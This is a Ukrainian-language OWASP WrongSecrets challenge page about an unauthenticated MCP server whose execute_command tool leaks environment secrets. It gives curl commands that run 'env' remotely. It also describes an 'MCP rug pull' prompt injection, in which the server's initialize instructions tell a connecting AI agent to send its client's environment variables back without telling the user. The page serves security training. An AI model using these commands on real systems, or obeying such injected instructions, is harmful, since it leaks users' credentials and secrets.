=== Експозиція змінних середовища сервера MCP

Протокол контексту моделі (MCP), розроблений Anthropic, – це відкритий стандарт, який дозволяє помічникам штучного інтелекту підключатися до інструментів та джерел даних. Хоча MCP забезпечує потужну інтеграцію, погано захищені сервери MCP становлять значний ризик для безпеки: вони можуть розкривати конфіденційні секрети, що зберігаються у змінних середовища, будь-кому, хто може до них отримати доступ.

Цей челендж демонструє реалістичний сценарій, коли розробник розгорнув MCP-сервер з інструментом `execute_command`. Цей тип інструменту поширений на MCP-серверах, що використовуються для надання доступу до оболонки помічникам штучного інтелекту, але ним може зловживати будь-хто, хто виявить кінцеву точку.

**Ваша мета:**

1. **Сервер MCP працює на виділеному порту (8090)** окремо від основної програми
2. **Сервер надає інструмент `execute_command`**, який повертає змінні середовища процесу
3. **Секрет (`WRONGSECRETS_MCP_SECRET`) зберігається як змінна середовища** у запущеному контейнері
4. **Сервер MCP не має автентифікації** — будь-хто, хто може зв’язатися з портом 8090, може викликати його інструменти.

**Як взаємодіяти із сервером MCP:**

Спочатку ознайомтеся з доступними інструментами:

[source,bash]
----
curl -s -X POST http://localhost:8090/mcp \
  -H 'Content-Type: application/json' \
  -d '{"jsonrpc":"2.0","id":1,"method":"tools/list"}'
----

[%collapsible, title="під час роботи з www.wrongsecrets.com"]
====

[source,bash]
----
curl -s -X POST https://www.wrongsecrets.com/mcp \
  -H 'Content-Type: application/json' \
  -d '{"jsonrpc":"2.0","id":1,"method":"tools/list"}'
----
====


Потім викличте інструмент `execute_command`, щоб отримати змінні середовища та знайти секрет:

[source,bash]
----
curl -s -X POST http://localhost:8090/mcp \
  -H 'Content-Type: application/json' \
  -d '{"jsonrpc":"2.0","id":2,"method":"tools/call","params":{"name":"execute_command","arguments":{"command":"env"}}}'
----


[%collapsible, title="під час роботи з www.wrongsecrets.com"]
====

[source,bash]
----
curl -s -X POST https://www.wrongsecrets.com/mcp \
  -H 'Content-Type: application/json' \
  -d '{"jsonrpc":"2.0","id":2,"method":"tools/call","params":{"name":"execute_command","arguments":{"command":"env"}}}'
----
====


****
🤖 *Цікавий факт — ін'єкція MCP Prompt («MCP Rug Pull»):*

Цей MCP-сервер робить ще один крок далі, ніж просто надавати змінні середовища пасивним викликачам. Він також вбудовує шкідливі інструкції у свою відповідь `initialize` (поле `instructions`). Коли легітимний помічник ШІ підключається до цього сервера, ці інструкції непомітно вводяться в системний запит моделі. Моделі наказують негайно викликати `execute_command` з `env`, а потім переслати результат інструменту `forward_env` — відправляючи власні змінні середовища *клієнта ШІ* назад на сервер — навіть не повідомляючи користувача.

Ви можете спробувати це локально, виконавши такі дії:

1. запустити контейнер локально (наприклад, `docker run -p 8080:8080 -p 8090:8090 ghcr.io/owasp/wrongsecrets/wrongsecrets-pr:pr-2400-7391231`)
2. налаштуйте агента, використовуючи MCP-сервер "http://localhost:8090/mcp" (або "https://www.wrongsecrets.com/mcp", якщо ви не проти витоку інформації в Інтернет)
3. ініціалізуйте агента та перегляньте журнали вашого контейнера, в яких зазначено "MCP forward_env отримав вилучені дані середовища клієнта (XXX символів)", що показує, що сервер MCP отримав ваші зміни середовища.

Це відомо як *MCP rug pull* або *MCP supply chain attack*, і це демонструє, чому вам завжди слід перевіряти поле `instructions` будь-якого MCP-сервера, до якого ви підключаєтеся, перш ніж довіряти йому. Далі, завжди переконайтеся, що ви дозволяєте використовувати MCP-сервери лише ізольованим процесам без доступу до секретів. Ніколи не викликайте MCP-сервери безпосередньо з терміналу, якщо присутні конфіденційні змінні ENV або файли.
****
